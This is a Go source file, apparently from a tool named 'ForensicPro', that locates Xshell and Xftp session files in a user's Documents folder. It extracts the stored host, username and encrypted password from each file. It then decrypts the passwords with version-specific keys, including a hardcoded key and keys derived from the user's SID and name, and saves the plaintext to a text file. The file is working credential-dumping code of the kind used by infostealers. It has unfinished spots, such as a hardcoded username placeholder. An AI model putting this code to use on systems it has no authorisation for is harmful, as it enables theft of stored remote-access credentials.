package SoftWares

import (
	"ForensicPro/utils"
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"golang.org/x/text/encoding/unicode"
	"golang.org/x/text/transform"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var XmanagerName = "Xmanager"

var sessionFiles []string

func GetAllAccessibleFiles(rootPath string) {
	directories, err := ioutil.ReadDir(rootPath)
	if err != nil {
		fmt.Println("Error reading directory:", err)
		return
	}

	for _, dir := range directories {
		if dir.IsDir() {
			dirPath := filepath.Join(rootPath, dir.Name())
			GetAllAccessibleFiles(dirPath)
		}
	}

	files, err := ioutil.ReadDir(rootPath)
	if err != nil {
		fmt.Println("Error reading directory:", err)
		return
	}

	for _, file := range files {
		if !file.IsDir() {
			filePath := filepath.Join(rootPath, file.Name())
			if filepath.Ext(filePath) == ".xsh" || filepath.Ext(filePath) == ".xfp" {
				sessionFiles = append(sessionFiles, filePath)
			}
		}
	}
}

// DecryptSessions 解密会话文件
func DecryptSessions() string {
	var stringBuilder bytes.Buffer
	currentUser := os.Getuid()

	//currentUserName := os.Getusername()
	// todo
	currentUserName := "chenyuanhang"
	text := fmt.Sprintf("%d", currentUser)
	text2 := currentUserName

	for _, sessionFile := range sessionFiles {
		list := ReadConfigFile(sessionFile)
		if len(list) >= 4 {
			stringBuilder.WriteString(fmt.Sprintf("Session File: %s\n", sessionFile))
			stringBuilder.WriteString(fmt.Sprintf("Version: %s", list[0]))
			stringBuilder.WriteString(fmt.Sprintf("Host: %s", list[1]))
			stringBuilder.WriteString(fmt.Sprintf("UserName: %s", list[2]))
			stringBuilder.WriteString(fmt.Sprintf("rawPass: %s", list[3]))
			stringBuilder.WriteString(fmt.Sprintf("UserName: %s\n", text2))
			stringBuilder.WriteString(fmt.Sprintf("Sid: %s\n", text))
			stringBuilder.WriteString(fmt.Sprintf("%s\n", Decrypt(text2, text, list[3], strings.ReplaceAll(list[0], "\r", ""))))
			stringBuilder.WriteString("\n")
		}
	}

	return stringBuilder.String()
}

// Decrypt function to decrypt the password based on the version
func Decrypt(username, sid, rawPass, ver string) string {
	// 代码bug，todo
	if strings.HasPrefix(ver, "5.0") || strings.HasPrefix(ver, "4") || strings.HasPrefix(ver, "3") || strings.HasPrefix(ver, "2") {
		array, _ := base64.StdEncoding.DecodeString(rawPass)
		key := sha256.New()
		key.Write([]byte("!X@s#h$e%l^l&"))
		keyHash := key.Sum(nil)

		array2 := array[:len(array)-32]
		bytes := utils.Decrypt(keyHash, array2)

		return "Decrypt rawPass: " + string(bytes)
	}

	if strings.HasPrefix(ver, "5.1") || strings.HasPrefix(ver, "5.2") {
		array3, _ := base64.StdEncoding.DecodeString(rawPass)
		key2 := sha256.New()
		key2.Write([]byte(sid))
		keyHash2 := key2.Sum(nil)

		array4 := array3[:len(array3)-32]
		bytes2 := utils.Decrypt(keyHash2, array4)

		return "Decrypt rawPass: " + string(bytes2)
	}

	if strings.HasPrefix(ver, "5") || strings.HasPrefix(ver, "6") || strings.HasPrefix(ver, "7.0") {
		array5, _ := base64.StdEncoding.DecodeString(rawPass)
		key3 := sha256.New()
		key3.Write([]byte(username + sid))
		keyHash3 := key3.Sum(nil)

		array6 := array5[:len(array5)-32]
		bytes3 := utils.Decrypt(keyHash3, array6)

		return "Decrypt rawPass: " + string(bytes3)
	}

	if strings.HasPrefix(ver, "7") {
		// Reverse the username and concatenate with sid
		reversedUsername := reverseString(username)
		s := reverseString(reversedUsername + sid)

		array7, _ := base64.StdEncoding.DecodeString(rawPass)
		key4 := sha256.New()
		key4.Write([]byte(s))
		keyHash4 := key4.Sum(nil)

		array8 := array7[:len(array7)-32]
		bytes4 := utils.Decrypt(keyHash4, array8)

		return "Decrypt rawPass: " + string(bytes4)
	}

	return ""
}

// Helper function to reverse a string
func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func ReadConfigFile(path string) []string {
	var list []string
	file, err := os.Open(path)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return list
	}
	defer file.Close()

	// 创建UTF-16解码器
	decoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
	reader := transform.NewReader(file, decoder)

	scanner := bufio.NewScanner(reader)
	scanner.Split(bufio.ScanLines)
	var inputStr strings.Builder

	for scanner.Scan() {
		line := scanner.Text()
		inputStr.WriteString(line + "\n")
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
		return list
	}

	input := inputStr.String()

	var item, item2, item3, text string

	re := regexp.MustCompile(`(?m)Version=(.*)`)
	match := re.FindStringSubmatch(input)
	if len(match) > 1 {
		item = match[1]
	}

	re = regexp.MustCompile(`(?m)Host=(.*)`)
	match = re.FindStringSubmatch(input)
	if len(match) > 1 {
		item2 = match[1]
	}

	re = regexp.MustCompile(`(?m)UserName=(.*)`)
	match = re.FindStringSubmatch(input)
	if len(match) > 1 {
		item3 = match[1]
	}

	re = regexp.MustCompile(`(?m)Password=(.*)`)
	match = re.FindStringSubmatch(input)
	if len(match) > 1 {
		text = match[1]
	}

	list = append(list, item, item2, item3)
	if len(text) > 3 {
		list = append(list, text)
	}

	return list
}
func XmanagerSave(path string) {

	rootPath, _ := utils.GetPersonalFolderPath()
	GetAllAccessibleFiles(rootPath + "\\Documents\\NetSarang Computer")
	if len(sessionFiles) != 0 {
		targetPath := filepath.Join(path, XmanagerName)
		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
			log.Fatalf("创建目录失败: %v", err)
		}

		sessionstext := DecryptSessions()
		err := utils.WriteToFile(sessionstext, targetPath+"\\sessions.txt")
		if err != nil {
			return
		}
	}

}
